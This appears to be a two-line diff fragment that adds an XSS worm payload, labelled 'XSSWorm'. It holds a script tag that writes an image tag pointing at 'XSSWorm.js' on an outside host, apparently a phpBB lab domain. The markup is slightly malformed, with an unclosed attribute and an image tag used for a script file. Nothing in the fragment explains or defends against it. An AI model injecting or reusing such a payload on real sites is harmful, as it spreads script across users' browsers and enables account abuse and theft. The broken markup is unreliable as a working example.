@@ -1,0 +1,2 @@
+XSSWorm
+<script>document.write('<img src="http://www.xxslabphpbb.com/XSSWorm.js")</script>
